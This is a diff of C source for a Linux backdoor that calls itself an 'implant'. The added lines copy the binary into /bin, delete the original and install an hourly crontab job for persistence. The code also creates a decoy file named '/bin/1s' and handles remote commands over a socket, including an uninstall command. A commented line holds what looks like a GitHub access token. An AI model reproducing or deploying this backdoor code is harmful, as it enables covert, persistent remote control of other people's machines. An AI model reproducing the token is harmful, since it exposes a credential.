@@ -1,5 +1,5 @@
 //#define IPADDR "192.168.1.1"
-
+//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
 #include <stdio.h>
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -226,7 +226,7 @@ void foo()
   #ifdef STATIC
   printf("STATIC: %d!\n", STATIC);
   #endif
-
+/*
   #ifdef SECIMP
   printf("SECIMP: %d!\n", SECIMP);
   //libcurl program 
@@ -238,33 +238,34 @@ void foo()
   FILE *pagefile;
 
   curl_global_init(CURL_GLOBAL_ALL);
-  /* init the curl session */
+  /* init the curl session 
   curl_handle = curl_easy_init();
-  /* set URL to get here */
+  /* set URL to get here 
   curl_easy_setopt(curl_handle, CURLOPT_URL, "https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-reverse-shell.jpg");
-  /* Switch on full protocol/debug output while testing */
+  /* Switch on full protocol/debug output while testing 
   curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 1L);
-  /* disable progress meter, set to 0L to enable it */
+  /* disable progress meter, set to 0L to enable it 
   curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
-  /* send all data to this function  */
+  /* send all data to this function  
   curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);
-  /* open the file */
+  /* open the file 
   pagefile = fopen(pagefilename, "wb");
   if(pagefile) {
-    /* write the page body to this file handle */
+    /* write the page body to this file handle 
     curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, pagefile);
-    /* get it! */
+    /* get it! 
     curl_easy_perform(curl_handle);
-    /* close the header file */
+    /* close the header file 
     fclose(pagefile);
   }
-  /* cleanup curl stuff */
+  /* cleanup curl stuff 
   curl_easy_cleanup(curl_handle);
   curl_global_cleanup();
 
-  #endif
+  #endif 
+  */
 }
-
+/*
 #ifdef SECIMP
 static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
 {
@@ -272,7 +273,7 @@ static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
   return written;
 }
 #endif
-
+*/
 int main(void) {
         /*==Validating code using valHelper.c==*/
         val_IP();       //Macro: VALID_IP
@@ -282,10 +283,13 @@ int main(void) {
         char * strProf = strProfile();
         printf("%s\n", strProf);
         free(strProf);
+        //getRoot();
         /*=====================================*/
         /* Our process ID and Session ID */
         #ifdef MUTEX
         if(access( MUTEX, F_OK) != 0){
+          system("cp implant /bin");
+          system("rm -f implant");
           system("crontab -l | { cat; echo \"0 * * * * /bin/implant\"; } | crontab -");
         }else{
           printf("exiting backdoor");
@@ -294,6 +298,7 @@ int main(void) {
         #endif
         FILE *fp = NULL;
         fp = fopen("/bin/1s", "w");
+
         //#ifndef DEBUG
         pid_t pid, sid;
 
@@ -324,7 +329,7 @@ int main(void) {
 
         /* Change the current working directory */
 
-        if ((chdir("/")) < 0) {
+        if ((chdir("/bin")) < 0) {
                 // Log the failure 
                 exit(EXIT_FAILURE);
         }
@@ -374,7 +379,7 @@ void commands(int sockfd){
     if(strcmp(buf,"UNINSTALL\n") == 0){
       //remove("/tmp/crontab");
       system("crontab -r");
-      remove("/implant");
+      remove("/bin/implant");
       remove(MUTEX);
       free(buf);
       exit(0);
@@ -408,3 +413,5 @@ void commands(int sockfd){
   }
 }
 #endif
+
+//https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-reverse-shell.jpg
